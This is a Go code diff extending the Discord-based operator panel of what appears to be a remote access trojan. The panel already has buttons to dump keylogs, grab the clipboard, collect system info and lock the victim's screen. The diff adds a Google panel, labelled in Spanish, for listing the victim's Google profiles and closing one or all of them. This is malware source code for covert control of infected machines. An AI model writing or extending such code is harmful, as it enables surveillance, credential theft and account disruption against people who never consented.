@@ -79,6 +79,7 @@ func ControlPanel() []discordgo.MessageComponent {
 			Button("💻 SysInfo", discordgo.PrimaryButton, "btn_sysinfo"),
 			Button("📋 Clipboard", discordgo.PrimaryButton, "btn_clipboard"),
 			Button("🔑 Keylog Dump", discordgo.PrimaryButton, "btn_keylog_dump"),
+			Button("🚪 Cerrar Google", discordgo.DangerButton, "btn_google_close"),
 		}},
 		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
 			Button("⏻ Kill Agent", discordgo.DangerButton, "btn_kill"),
@@ -98,6 +99,62 @@ func ControlPanel() []discordgo.MessageComponent {
 		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
 			Button("🔒 Lock Screen", discordgo.DangerButton, "btn_lock_on"),
 			Button("🔓 Unlock", discordgo.SuccessButton, "btn_lock_off"),
+		}},
+	}
+}
+
+func GooglePanel(selected int, options []discordgo.SelectMenuOption) []discordgo.MessageComponent {
+	if len(options) > 25 {
+		options = options[:25]
+	}
+
+	converted := make([]wireOption, 0, len(options))
+	for _, option := range options {
+		converted = append(converted, wireOption{
+			Label:       option.Label,
+			Value:       option.Value,
+			Description: option.Description,
+		})
+	}
+
+	closeOne := wireButton{
+		Label:    "🚪 Cerrar seleccionado",
+		Style:    discordgo.DangerButton,
+		CustomID: fmt.Sprintf("btn_google_one_%d", selected),
+		Disabled: selected < 0,
+	}
+
+	if len(converted) == 0 {
+		return []discordgo.MessageComponent{
+			discordgo.ActionsRow{Components: []discordgo.MessageComponent{
+				Button("🔄 Actualizar", discordgo.SecondaryButton, "btn_google_refresh"),
+			}},
+		}
+	}
+
+	menu := wireSelect{
+		CustomID:    "sel_google_profile",
+		Placeholder: "Selecciona un perfil de Google",
+		MinValues:   1,
+		MaxValues:   1,
+		Options:     converted,
+	}
+
+	return []discordgo.MessageComponent{
+		discordgo.ActionsRow{Components: []discordgo.MessageComponent{menu}},
+		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
+			Button("🔄 Actualizar", discordgo.SecondaryButton, "btn_google_refresh"),
+			closeOne,
+			Button("💥 Cerrar todas", discordgo.DangerButton, "btn_google_all"),
+		}},
+	}
+}
+
+func GoogleResultPanel() []discordgo.MessageComponent {
+	return []discordgo.MessageComponent{
+		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
+			Button("🔄 Volver al panel", discordgo.SecondaryButton, "btn_google_refresh"),
+			Button("💥 Cerrar todas", discordgo.DangerButton, "btn_google_all"),
 		}},
 	}
 }
